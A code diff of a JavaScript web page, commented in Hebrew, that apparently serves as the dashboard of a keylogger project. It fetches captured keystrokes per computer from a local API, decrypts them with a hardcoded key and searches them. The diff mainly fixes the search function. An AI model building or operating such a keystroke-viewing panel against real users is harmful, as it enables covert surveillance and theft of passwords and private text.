@@ -11,12 +11,14 @@ const key = ['H', 'E', 'n', 'x', '@', 'U', '5', 'P', '=', '0', '-', '3', 'm', '*
 const urlparams =  new URLSearchParams(window.location.search)
 const computer = urlparams.get("computer")
 
+
 //  מכניס את הפרמטר לכותרת
 const h1 = document.getElementById("h1")
 h1.textContent = computer
 
 // בקשת מידע מהשרת - כל המידע הקיים על המחשב שנשלח כפרמטר 
 const request = () => {
+
 
     fetch(`http://127.0.0.1:5000/api/get_keystrokes?computer=${computer}`).then(
         response => response.json().then(
@@ -79,7 +81,9 @@ const deciphering = (text) => {
 }
 
 // פונקציית חיפוש לפי טקסט
-const search = (text) => {
+const search = () => {
+    const text = document.getElementById("text").value.trim();
+    console.log(text)
     // שמכילים את התוכן h3 ניגש לכל האלמנטים  
     const allelemenets = document.querySelectorAll("h3");
     console.log(allelemenets)
@@ -92,7 +96,7 @@ const search = (text) => {
         let faund = false
         // faund עובר על כל אחד ובודק אם הוא מכיל את הטקסט הרצוי אם כן מסמן זאת במשתנה 
         for (let j = 0; j < paragraphs.length; j ++){
-            if (paragraphs[j].textContent.includes("11:03")){
+            if (paragraphs[j].textContent.includes(text)){
                 faund = true;
                 break;
             }
@@ -121,7 +125,11 @@ const reverse_data = () => {
     )
 }
 
-
-
 request()
+const link_search = document.getElementById("mylink")
+link_search.addEventListener("click", () => {
+    event.preventDefault();
+    search()
+})
+
 
